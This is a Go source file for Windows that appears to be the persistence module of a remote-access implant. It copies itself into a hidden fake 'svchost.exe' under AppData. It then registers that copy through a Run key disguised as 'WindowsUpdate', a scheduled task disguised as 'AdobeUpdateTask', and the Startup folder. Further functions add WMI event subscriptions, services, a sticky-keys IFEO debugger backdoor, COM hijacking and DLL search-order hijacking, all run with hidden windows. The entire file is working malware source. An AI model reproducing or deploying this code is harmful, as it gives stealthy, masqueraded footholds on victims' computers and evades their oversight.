//go:build windows
// +build windows

package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

func addPersistenceLinux() error  { return fmt.Errorf("persistence: linux not supported on windows") }
func addPersistenceDarwin() error { return fmt.Errorf("persistence: darwin not supported on windows") }

func addPersistenceWindows() {
	srcPath, err := os.Executable()
	if err != nil {
		if Debug {
			fmt.Printf("[persist] failed to get exe path: %v\n", err)
		}
		return
	}

	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	if appData == "" {
		appData = os.TempDir()
	}
	persistDir := filepath.Join(appData, "Microsoft", "Crypto", "RSA")
	if err := os.MkdirAll(persistDir, 0755); err != nil {
		if Debug {
			fmt.Printf("[persist] mkdir failed: %v\n", err)
		}
		return
	}

	dstPath := filepath.Join(persistDir, "svchost.exe")

	needCopy := true
	if dstInfo, err := os.Stat(dstPath); err == nil {
		if srcInfo, err := os.Stat(srcPath); err == nil {
			if dstInfo.ModTime().After(srcInfo.ModTime()) || dstInfo.Size() == srcInfo.Size() {
				needCopy = false
			}
		}
	}

	if needCopy {
		src, err := os.Open(srcPath)
		if err != nil {
			if Debug {
				fmt.Printf("[persist] open src failed: %v\n", err)
			}
			return
		}
		defer src.Close()

		dst, err := os.Create(dstPath)
		if err != nil {
			if Debug {
				fmt.Printf("[persist] create dst failed: %v\n", err)
			}
			return
		}
		_, err = io.Copy(dst, src)
		dst.Close()
		if err != nil {
			if Debug {
				fmt.Printf("[persist] copy failed: %v\n", err)
			}
			return
		}

		setHidden(dstPath)
		if Debug {
			fmt.Printf("[persist] copied to %s\n", dstPath)
		}
	}

	regCmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", dstPath, "/f")
	applyHideWindow(regCmd)
	regOut, regErr := regCmd.CombinedOutput()
	if Debug {
		if regErr != nil {
			fmt.Printf("[persist] HKCU Run failed: %v %s\n", regErr, string(regOut))
		} else {
			fmt.Printf("[persist] HKCU Run registered\n")
		}
	}

	taskName := "AdobeUpdateTask"
	schtasks := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", dstPath, "/sc", "onlogon", "/f", "/it")
	applyHideWindow(schtasks)
	taskOut, taskErr := schtasks.CombinedOutput()
	if Debug {
		if taskErr != nil {
			fmt.Printf("[persist] schtasks failed: %v %s\n", taskErr, string(taskOut))
		} else {
			fmt.Printf("[persist] scheduled task created\n")
		}
	}

	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0755); err != nil && Debug {
		fmt.Printf("[persist] startup dir mkdir failed: %v\n", err)
	}
	startupPath := filepath.Join(startupDir, "svchost.exe")
	if _, err := os.Stat(startupPath); os.IsNotExist(err) {
		if src, err := os.Open(dstPath); err == nil {
			if dst, err := os.Create(startupPath); err == nil {
				io.Copy(dst, src)
				dst.Close()
				setHidden(startupPath)
			}
			src.Close()
		}
	}
	if Debug {
		fmt.Printf("[persist] startup folder persistence attempted: %s\n", startupPath)
	}
}

func setHidden(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	procSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), 0x2)
}

func applyPersistence(method string, args string) string {
	switch method {
	case "registry":
		return persistRegistryRun(args)
	case "scheduled_task":
		return persistScheduledTask(args)
	case "startup_folder":
		return persistStartupFolder(args)
	case "wmi":
		return persistWMI(args)
	case "service":
		return persistService(args)
	case "image_file":
		return persistIFEO(args)
	case "com_hijack":
		return persistCOMHijack(args)
	case "dll_search_order":
		return persistDLLHijack(args)
	default:
		return fmt.Sprintf("unknown persistence method: %s", method)
	}
}

func persistRegistryRun(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("registry: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", persistencePrefix, "/t", "REG_SZ", "/d", binaryPath, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("registry: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("registry: persistence added via HKCU Run key -> %s", binaryPath)
}

func persistScheduledTask(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("scheduled_task: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	taskName := persistencePrefix + "Update"
	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", binaryPath, "/sc", "onlogon", "/f", "/it")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("scheduled_task: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("scheduled_task: created task '%s' -> %s", taskName, binaryPath)
}

func persistStartupFolder(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("startup_folder: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return fmt.Sprintf("startup_folder: mkdir failed: %v", err)
	}
	dst := filepath.Join(startupDir, persistencePrefix+".exe")
	src, err := os.Open(binaryPath)
	if err != nil {
		return fmt.Sprintf("startup_folder: open src failed: %v", err)
	}
	defer src.Close()
	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Sprintf("startup_folder: create dst failed: %v", err)
	}
	defer dstFile.Close()
	if _, err := io.Copy(dstFile, src); err != nil {
		return fmt.Sprintf("startup_folder: copy failed: %v", err)
	}
	setHidden(dst)
	return fmt.Sprintf("startup_folder: copied to %s", dst)
}

func persistWMI(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("wmi: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	filterName := persistencePrefix + "Filter"
	consumerName := persistencePrefix + "Consumer"
	psCmd := fmt.Sprintf(`
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "%s"
$filter.Put() | Out-Null
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = "%s"
$consumer.CommandLineTemplate = "%s"
$consumer.Put() | Out-Null
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = "__EventFilter.Name='%s'"
$binding.Consumer = "CommandLineEventConsumer.Name='%s'"
$binding.Put() | Out-Null
Write-Output "WMI persistence added"
`, filterName, consumerName, binaryPath, filterName, consumerName)
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("wmi: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("wmi: event subscription created for -> %s", binaryPath)
}

func persistService(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("service: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	serviceName := persistencePrefix + "Svc"
	cmd := exec.Command("sc", "create", serviceName, "binPath=", binaryPath, "start=", "auto", "DisplayName=", persistencePrefix+" Service")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("service: sc create failed: %v %s", err, string(out))
	}
	cmd2 := exec.Command("sc", "start", serviceName)
	applyHideWindow(cmd2)
	out2, err2 := cmd2.CombinedOutput()
	if err2 != nil {
		return fmt.Sprintf("service: created but start failed: %v %s", err2, string(out2))
	}
	return fmt.Sprintf("service: created and started '%s' -> %s", serviceName, binaryPath)
}

func persistIFEO(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("image_file: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	target := "sethc.exe"
	key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, target)
	cmd := exec.Command("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", binaryPath, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("image_file: failed: %v %s", err, string(out))
	}
	return fmt.Sprintf("image_file: IFEO debugger set for %s -> %s", target, binaryPath)
}

func persistCOMHijack(args string) string {
	binaryPath := args
	if binaryPath == "" {
		p, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("com_hijack: failed to get exe path: %v", err)
		}
		binaryPath = p
	}
	clsid := "{B5F8350B-0548-4B5A-A625-EC63F3824F4E}"
	keyBase := fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid)
	cmds := [][]string{
		{"reg", "add", keyBase, "/f"},
		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/ve", "/t", "REG_SZ", "/d", binaryPath, "/f"},
		{"reg", "add", fmt.Sprintf(`%s\InprocServer32`, keyBase), "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Apartment", "/f"},
	}
	for _, c := range cmds {
		rc := exec.Command(c[0], c[1:]...)
		applyHideWindow(rc)
		if out, err := rc.CombinedOutput(); err != nil {
			return fmt.Sprintf("com_hijack: reg step failed: %v %s", err, string(out))
		}
	}
	return fmt.Sprintf("com_hijack: CLSID %s -> %s", clsid, binaryPath)
}

func persistDLLHijack(args string) string {
	dllPath := args
	if dllPath == "" {
		return "dll_search_order: dll path required"
	}
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	hijackDir := filepath.Join(appData, "Microsoft", "Windows", "Caches")
	if err := os.MkdirAll(hijackDir, 0755); err != nil {
		return fmt.Sprintf("dll_search_order: mkdir failed: %v", err)
	}
	src, err := os.Open(dllPath)
	if err != nil {
		return fmt.Sprintf("dll_search_order: open src failed: %v", err)
	}
	defer src.Close()
	dst := filepath.Join(hijackDir, "version.dll")
	dstFile, err := os.Create(dst)
	if err != nil {
		return fmt.Sprintf("dll_search_order: create dst failed: %v", err)
	}
	defer dstFile.Close()
	if _, err := io.Copy(dstFile, src); err != nil {
		return fmt.Sprintf("dll_search_order: copy failed: %v", err)
	}
	return fmt.Sprintf("dll_search_order: planted DLL at %s", dst)
}

func listPersistence() string {
	var results []string
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}

	cmd := exec.Command("reg", "query", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate")
	applyHideWindow(cmd)
	if out, _ := cmd.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] Registry Run key (WindowsUpdate): found")
	} else {
		results = append(results, "[-] Registry Run key (WindowsUpdate): not found")
	}

	cmd2 := exec.Command("schtasks", "/query", "/tn", "AdobeUpdateTask", "/fo", "LIST")
	applyHideWindow(cmd2)
	if out, _ := cmd2.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] Scheduled task (AdobeUpdateTask): found")
	} else {
		results = append(results, "[-] Scheduled task (AdobeUpdateTask): not found")
	}

	startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe`)
	if _, err := os.Stat(startupPath); err == nil {
		results = append(results, "[+] Startup folder: svchost.exe present")
	} else {
		results = append(results, "[-] Startup folder: svchost.exe not found")
	}

	psCmd := "Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like \"*" + persistencePrefix + "*\" } | Format-List | Out-String"
	cmd3 := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
	applyHideWindow(cmd3)
	if out, _ := cmd3.CombinedOutput(); len(strings.TrimSpace(string(out))) > 0 {
		results = append(results, "[+] WMI subscription ("+persistencePrefix+"): found")
	} else {
		results = append(results, "[-] WMI subscription ("+persistencePrefix+"): not found")
	}

	cmd4 := exec.Command("sc", "query", persistencePrefix+"Svc")
	applyHideWindow(cmd4)
	if out, _ := cmd4.CombinedOutput(); strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED") {
		results = append(results, "[+] Service ("+persistencePrefix+"Svc): found")
	} else {
		results = append(results, "[-] Service ("+persistencePrefix+"Svc): not found")
	}

	cmd5 := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/v", "Debugger")
	applyHideWindow(cmd5)
	if out, _ := cmd5.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] IFEO sethc.exe debugger: found")
	} else {
		results = append(results, "[-] IFEO sethc.exe debugger: not found")
	}

	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5A-A625-EC63F3824F4E}`)
	applyHideWindow(cmd6)
	if out, _ := cmd6.CombinedOutput(); len(out) > 0 {
		results = append(results, "[+] COM hijack CLSID: found")
	} else {
		results = append(results, "[-] COM hijack CLSID: not found")
	}

	return strings.Join(results, "\n")
}

func removePersistence(method string, args string) string {
	switch method {
	case "registry":
		// Remove both the auto-install name (WindowsUpdate) and the explicit
		// install name (persistencePrefix) so cleanup matches either scheme.
		removed := false
		for _, name := range []string{"WindowsUpdate", persistencePrefix} {
			cmd := exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", name, "/f")
			applyHideWindow(cmd)
			if _, err := cmd.CombinedOutput(); err == nil {
				removed = true
			}
		}
		if !removed {
			return "registry remove: failed (no Run key entry found)"
		}
		return "registry: removed Run key"

	case "scheduled_task":
		removed := false
		for _, name := range []string{"AdobeUpdateTask", persistencePrefix + "Update"} {
			cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
			applyHideWindow(cmd)
			if _, err := cmd.CombinedOutput(); err == nil {
				removed = true
			}
		}
		if !removed {
			return "scheduled_task remove: failed (no task found)"
		}
		return "scheduled_task: removed task"

	case "startup_folder":
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = os.Getenv("LOCALAPPDATA")
		}
		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
		removed := false
		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
			if err := os.Remove(filepath.Join(startupDir, name)); err == nil {
				removed = true
			}
		}
		if !removed {
			return "startup_folder remove: failed (no startup file found)"
		}
		return "startup_folder: removed startup file"

	case "wmi":
		psCmd := fmt.Sprintf(`$binding = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match %q }; $binding | Remove-WmiObject; $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -match %q }; $filter | Remove-WmiObject; $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match %q }; $consumer | Remove-WmiObject; Write-Output "WMI persistence removed"`, persistencePrefix, persistencePrefix, persistencePrefix)
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("wmi remove: failed: %v %s", err, string(out))
		}
		return "wmi: removed event subscriptions"

	case "service":
		cmds := [][]string{
			{"sc", "stop", persistencePrefix + "Svc"},
			{"sc", "delete", persistencePrefix + "Svc"},
		}
		var errs []string
		for _, c := range cmds {
			rc := exec.Command(c[0], c[1:]...)
			applyHideWindow(rc)
			if out, err := rc.CombinedOutput(); err != nil {
				errs = append(errs, fmt.Sprintf("%s: %v %s", strings.Join(c, " "), err, string(out)))
			}
		}
		if len(errs) > 0 {
			return fmt.Sprintf("service remove failed: %s", strings.Join(errs, "; "))
		}
		return "service: removed " + persistencePrefix + "Svc"

	case "image_file":
		cmd := exec.Command("reg", "delete", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("image_file remove: failed: %v %s", err, string(out))
		}
		return "image_file: removed IFEO debugger"

	case "com_hijack":
		clsid := "{B5F8350B-0548-4B5A-A625-EC63F3824F4E}"
		cmd := exec.Command("reg", "delete", fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid), "/f")
		applyHideWindow(cmd)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("com_hijack remove: failed: %v %s", err, string(out))
		}
		return "com_hijack: removed CLSID"

	case "dll_search_order":
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = os.Getenv("LOCALAPPDATA")
		}
		hijackPath := filepath.Join(appData, "Microsoft", "Windows", "Caches", "version.dll")
		if err := os.Remove(hijackPath); err != nil {
			return fmt.Sprintf("dll_search_order remove: failed: %v", err)
		}
		return "dll_search_order: removed hijack DLL"

	default:
		return fmt.Sprintf("unknown persistence method: %s", method)
	}
}

func regGetWindows(key string) (string, error) {
	cmd := exec.Command("reg", "query", key, "/s")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reg query failed: %s", string(out))
	}
	return string(out), nil
}

func regSetWindows(path, data string) error {
	parts := strings.SplitN(data, "|", 2)
	if len(parts) != 2 {
		return fmt.Errorf("data format: TYPE|value e.g. REG_SZ|hello")
	}
	typ := parts[0]
	val := parts[1]

	cmd := exec.Command("reg", "add", path, "/ve", "/t", typ, "/d", val, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add failed: %s", string(out))
	}
	return nil
}

func regDeleteWindows(key string) error {
	cmd := exec.Command("reg", "delete", key, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg delete failed: %s", string(out))
	}
	return nil
}
